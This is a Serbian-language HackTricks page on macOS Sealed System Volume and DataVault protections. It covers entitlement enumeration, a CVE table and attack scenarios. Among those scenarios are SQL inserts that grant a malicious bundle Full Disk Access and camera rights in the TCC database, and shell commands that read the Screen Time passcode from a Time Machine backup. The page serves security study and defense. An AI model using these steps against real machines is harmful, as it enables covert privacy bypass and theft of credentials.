# Zapečaćeni sistemski volumen macOS-a i DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Zapečaćeni sistemski volumen (SSV)

### Osnovne informacije

Počevši od **macOS Big Sur (11.0)**, sistemski volumen je kriptografski zapečaćen pomoću **hash stabla APFS snapshot-a**. To se naziva **Sealed System Volume (SSV)**. Sistemska particija se montira **samo za čitanje**, a svaka izmena narušava pečat, što se proverava tokom pokretanja.<sup>[[11]](#references)</sup>

SSV pruža:
- **Otkrivanje neovlašćenih izmena** — svaka izmena sistemskih binarnih datoteka ili framework-a menja koren Merkle stabla i poništava pečat koji je potpisao Apple
- **Proveru autentičnosti pri pokretanju** — lanac pokretanja proverava izabrani sistemski snapshot pre nego što on postane korenski fajl-sistem
- **Otpornost na rootkit-ove** — čak ni root ne može trajno da zameni fajlove u autentifikovanom sistemskom snapshot-u bez onemogućavanja authenticated root-a ili kompromitovanja ovlašćenog puta za ažuriranje

SSV štiti volumen **System**, a ne upisivi volumen **Data** koji je uparen s njim. Firmlink-ovi spajaju oba volumena u imenski prostor vidljiv na putanji `/`, pa putanja koja izgleda kao da je upisiva ne dokazuje da osnovni objekat pripada zapečaćenom snapshot-u. FileVault i Data Protection štite poverljivost podataka u mirovanju; oni su odvojeni od integriteta koji obezbeđuje SSV.<sup>[[11]](#references)</sup>

### Provera statusa SSV-а

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Efektivni prikaz sistema: SSV + Cryptex grafts

U novijim izdanjima macOS-a, nije svaki izvršni fajl vidljiv ispod `/System` nužno deo pokrenutog SSV snimka. **Cryptexes** su zasebno autentifikovane APFS slike diska čiji se sadržaj graftuje preko odabranih direktorijuma; zato Rapid Security Responses mogu da zamene komponente osetljive na bezbednost bez ponovne izgradnje osnovnog SSV-a. Prilikom analize persistence-a ili poređenja sistemskog koda, popišite aktivne mount-ove i Preboot Cryptex skladište umesto da hashujete samo osnovni snimak:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

Detalji o lancu pokretanja i Rapid Security Response opisani su u [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses); ovaj odeljak se bavi isključivo granicom SSV-a.

### Ovlašćenja za SSV zapisivače

Određeni Apple sistemski binarni fajlovi imaju ovlašćenja koja im omogućavaju da menjaju zapečaćeni sistemski volumen ili upravljaju njime:

| Ovlašćenje | Svrha |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Vraćanje sistemskog volumena na prethodni snimak |
| `com.apple.private.apfs.create-sealed-snapshot` | Kreiranje novog zapečaćenog snimka nakon ažuriranja sistema |
| `com.apple.rootless.install.heritable` | Upisivanje u SIP-om zaštićene putanje (nasleđuju ih podređeni procesi) |
| `com.apple.rootless.install` | Upisivanje u SIP-om zaštićene putanje |

### Pronalaženje SSV zapisivača

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Scenarioi napada

#### Snapshot Rollback Attack

Ako napadač kompromituje binarnu datoteku sa `com.apple.private.apfs.revert-to-snapshot`, može da **vrati sistemski volumen u stanje pre ažuriranja** i tako ponovo uvede poznate ranjivosti:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> Vraćanje snapshot-a efektivno **poništava bezbednosna ažuriranja**, vraćajući ranjivosti kernela i sistema koje su prethodno bile zakrpljene. Ovo je jedna od najopasnijih operacija koje je moguće izvesti na modernom macOS-u.

#### Zamena sistemskih binarnih datoteka

Uz zaobilaženje SIP-a + mogućnost upisivanja u SSV, napadač može da:

1. Montira sistemski volumen sa mogućnošću upisivanja
2. Zameni sistemski daemon ili framework biblioteku trojanizovanom verzijom
3. Ponovo zapečati snapshot (ili prihvati neispravan pečat ako je SIP već oslabljen)
4. Rootkit ostaje prisutan nakon ponovnog pokretanja i nevidljiv je alatima za detekciju u userland-u

### CVE-jevi iz stvarnog sveta

| CVE | Opis |
|---|---|
| CVE-2021-30892 | **Shrootless** — zaobilaženje SIP-a koje zloupotrebljava entitlement `com.apple.rootless.install.heritable` za `system_installd` radi izvršavanja proizvoljnih post-install skripti ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | Zaobilaženje SIP-a: `system_installd` je post-install skriptu postavio u fasciklu zaštićenu SIP-om unutar `/tmp`, ali sam `/tmp` nije zaštićen SIP-om, pa je fascikla mogla biti zamenjena montiranjem slike diska preko nje ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — copy-on-write trka u XNU-u koja omogućava upisivanje u datoteke samo za čitanje u vlasništvu root-a ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Osnovne informacije

**DataVault** je zaštita datotečnog sistema za osetljive datoteke i direktorijume, kojoj pristup kontrolišu entitlements. BSD oznaka `UF_DATAVAULT` (`0x00000080`) označava da je za čitanje i upisivanje u objekat potreban entitlement; za razliku od uobičajenog DAC-a, samo dobijanje privilegija **root** ili Full Disk Access ne zadovoljava tu proveru dok je zaštita aktivna.<sup>[[4]](#references)[[13]](#references)</sup>

Nemojte koristiti „DataVault” kao sinonim za svaku zaštićenu bazu podataka. TCC baze podataka uređuju TCC/FDA i pravila specifična za SIP (pogledajte [macOS TCC](macos-tcc/README.md)), dok pristup stavkama keychain-a zavisi i od ACL-ova keychain-a i kriptografske zaštite (pogledajte [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Konkretni primeri DataVault-a često se nalaze u skladištima u vlasništvu servisa, ispod putanja `/private/var/folders/.../0/`, kao što je skladište Screen Time-a; oznaka se prikazuje kao `datavault` u BSD oznakama datoteke kada je moguće izvršiti `stat` nad nadređenim direktorijumom.

### Entitlements kontrolera DataVault-a

| Entitlement | Granica |
|---|---|
| `com.apple.rootless.datavault.controller` | Pristup objektima `UF_DATAVAULT` i upravljanje njima<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Upravljanje TCC odlukama; ovo je povezana, ali zasebna granica privatnosti |
| `com.apple.private.tcc.allow` | Zaobilaženje izabranih TCC servisa navedenih u vrednosti entitlement-a |
| `com.apple.rootless.storage.TCC` | Upisivanje u TCC skladište zaštićeno SIP-om |

Proces koji kombinuje entitlement kontrolera DataVault-a sa FDA, funkcionalnošću za pravljenje rezervnih kopija, indeksiranje ili IPC posebno je zanimljiv: potražite primitiv zbunjenog posrednika koji kopira zaštićeni objekat na običnu putanju, umesto da pokušava direktno da otvori vault.<sup>[[14]](#references)</sup>

### Pronalaženje kontrolera DataVault-а

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Scenariji napada

#### Direktna izmena TCC baze podataka (zasebna TCC granica)

Ako napadač kompromituje TCC manager proces (npr. putem code injection u proces koji ima `com.apple.private.tcc.manager`), može **direktno da izmeni TCC bazu podataka** i dodeli bilo kojoj aplikaciji bilo koju TCC dozvolu:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> Izmena TCC baze podataka je **krajnji način zaobilaženja zaštite privatnosti** — tiho dodeljuje bilo koju dozvolu, bez ikakvog upita korisniku ili vidljivog indikatora. Istorijski gledano, više lanaca eskalacije privilegija u macOS-u završilo se upisivanjem u TCC bazu podataka kao završnim payloadom.

#### Pristup Keychain bazi podataka

Direktan pristup pozadinskoj bazi podataka Keychain-a nije isto što i pristup tajnama u otvorenom tekstu. Čak i ako druga granica privilegija omogući napadaču da kopira bazu podataka, i dalje je potrebno napasti materijal ključeva i ACL-ove stavki; pogledajte namensku stranicu o [macOS Keychain](../../macos-red-teaming/macos-keychain.md), umesto da pretpostavite da je entitlement DataVault controller dovoljan.

#### Granica kopije rezervne kopije: Time Machine

Analiza iz 2026. pokazala je koristan opšti obrazac: `backupd` ima i `com.apple.rootless.datavault.controller` i Full Disk Access, kako bi mogao da kopira zaštićene skladišne prostore. U testiranoj konfiguraciji, `/private/var/folders` je bio obuhvaćen Time Machine-om, a montirana kopija rezervne kopije nije sprovodila aktivnu DataVault granicu. Istraživač je iskoristio ovo da pronađe SQLite skladište Screen Time-a i pročita PIN za ograničenja u otvorenom tekstu, bez otvaranja aktivnog vault-a. Posmatrajte ovo kao **napad na granicu kopije**: ispitajte pomoćne procese za pravljenje rezervnih kopija, izvoz, migraciju, indeksiranje i dijagnostiku koji mogu da prenesu podatke iz vault-a na slabije zaštićen mount ili putanju.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

Ovo ponašanje zavisi od verzije i rasporeda rezervne kopije. Proverite ga na ciljnoj verziji sistema i imajte na umu da šifrovano odredište Time Machine-a štiti kopiju samo dok je zaključano; kada se montira, njegove kontrole pristupa postaju deo površine napada.

### CVE-ovi iz stvarnog sveta koji uključuju DataVault/TCC bypass

| CVE | Opis |
|---|---|
| CVE-2024-44131 | Symlink race u FileProvider-u omogućava privilegovanom pomoćnom procesu da pristupi podacima zaštićenim TCC-om ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Kao root, **kreirati novog korisnika čiji `NFSHomeDirectory` pokazuje na napadačev `TCC.db`**; pri prijavi, `tccd` ga učitava i primenjuje dodeljene dozvole, čime se omogućava pristup podacima drugih korisnika ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | „powerdir”: promena korisnikovog home direktorijuma radi postavljanja napadačevog `TCC.db` ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Greška u zaključivanju identiteta bundle-a omogućava aplikaciji da **nasledi TCC dozvole donor bundle-a** bez upita; **XCSSET** ju je koristio u stvarnim napadima za snimanje ekrana ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` je putanju do baze podataka pravio na osnovu `$HOME`, pa ju je `launchctl setenv HOME` preusmeravao na napadačev `TCC.db` ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` je imao `com.apple.private.tcc.manager` **i** isključenu validaciju biblioteka, pa je HAL dodatak postavljen u `/Library/Audio/Plug-Ins/HAL` mogao da dodeli proizvoljna TCC prava ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft otkriva novu macOS ranjivost, Shrootless, koja bi mogla da zaobiđe System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Tehnička analiza: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Vredno je raditi loše](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Zaštita podataka](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass krade podatke sa iCloud-a](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Otkrivanje macOS malware-a: zaobilaženje TCC-a](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Nova macOS ranjivost „powerdir” mogla bi da omogući neovlašćen pristup korisničkim podacima](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [U XCSSET malware-u otkriven zero-day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: Zaobilaženje macOS okvira Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Pustite muziku i zaobiđite TCC, odnosno CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [Noćna mora Apple OTA ažuriranja (APFS snimci)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC eksploatacija](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Kako zaobići sopstvenu Screen Time šifru — izvorni kod i analiza Time Machine/DataVault-a](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
